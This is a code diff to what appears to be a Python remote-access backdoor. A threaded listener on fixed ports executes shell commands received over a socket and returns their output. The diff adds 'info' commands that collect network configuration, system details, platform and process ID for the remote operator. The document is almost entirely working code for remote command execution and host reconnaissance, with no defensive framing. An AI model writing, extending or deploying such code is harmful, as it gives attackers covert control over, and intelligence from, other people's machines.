@@ -18,6 +18,23 @@ public_key_pem = None
 private_key = None
 
 
+class Commands:
+    def ip():
+        if platform.system() == 'Windows':
+            return subprocess.check_output('ipconfig /all', shell=True).decode('cp850')
+        else:
+            return subprocess.check_output('ip addr show', shell=True).decode('UTF-8')
+
+    def system():
+        return platform.uname()
+
+    def platform():
+        return platform.platform().replace('-', ' ')
+
+    def pid():
+        return "Process ID :", os.getpid()
+
+
 class InThread(threading.Thread):
     IN_PORT = 44455
     OUT_PORT = 44444
@@ -70,9 +87,19 @@ class InThread(threading.Thread):
                                 cons.send(resp)
                         except subprocess.CalledProcessError:
                             cons.send("Impossible d'exécuter cette commande")
-            else:
-                pass
-        print('stopping threads')
+            elif msg[:4] == 'info':
+                known_comm = ['sysinfo', 'ip', 'platform', 'pid']
+                if msg[5:] == 'sysinfo':
+                    resp = ' '.join(Commands.system())
+                elif msg[5:] == 'ip':
+                    resp = Commands.ip()
+                elif msg[5:] == 'platform':
+                    resp = Commands.platform()
+                elif msg[5:] == 'pid':
+                    resp = Commands.pid()
+                else:
+                    resp = ('List of available information gathering commands : info + [{}]'.format(known_comm))
+                cons.send(str(resp))
         cons.stop()
         #self.socket.shutdown(socket.SHUT_RDWR)
         self.socket.close()
